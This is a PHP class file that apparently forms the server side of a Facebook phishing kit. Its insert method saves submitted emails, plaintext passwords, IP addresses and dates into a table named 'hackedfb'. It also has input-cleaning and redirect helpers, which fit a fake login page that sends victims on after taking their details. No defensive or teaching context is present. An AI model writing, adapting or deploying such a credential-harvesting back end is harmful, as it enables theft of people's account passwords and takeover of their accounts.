<?php

  include "../Config/dbconnect.php";

    class Login{

            private static $db;

            public function __construct($conn)
            {
                Login::$db=$conn;
            }

            public static function insert($email, $password, $ip,$date)
            {
                $query="INSERT INTO hackedfb(email,password,ip,date)VALUES(?,?,?,?)";
                $stmt=Login::$db->prepare($query);
                $stmt->bind_param("ssss",$email, $password,$ip,$date);
                if($stmt->execute()){
                    return true;
                }else{
                    return false;
                }
            }

            public static function validate($input)
            {
                $input=trim($input);
                $input=stripslashes($input);
                $input=htmlspecialchars($input);            
                return $input;    
            }

            public  static function escapeString($input)
            {
              $input=Login::$db->real_escape_string($input);
              return $input;    
            }
            
            public  static function redirect(string $url):never{
                header('location:'.$url );
                exit();
            }




    }
    





?>